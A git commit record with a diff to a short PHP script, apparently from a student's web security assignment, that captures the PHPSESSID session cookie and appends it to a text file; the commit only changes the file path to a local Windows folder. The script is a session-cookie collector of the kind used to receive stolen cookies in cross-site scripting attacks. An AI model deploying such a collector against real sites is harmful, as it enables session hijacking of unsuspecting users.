3302b5d554432caf731e4ba12ec39f349e282c68
basthijssen <b.f.thijssen@student.ru.nl>
2017-04-25 15:39:32 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 $cookie = $_COOKIE['PHPSESSID'];
-$file = fopen('cookie.txt', 'a');
+$file = fopen('C:\Users\Bfkth\Dropbox\Bureaublad\Informatica\Kwartiel 4\Web Security\Assignment 4\cookie.txt', 'a');
 fwrite($file, $cookie . "\n\n");
 ?>
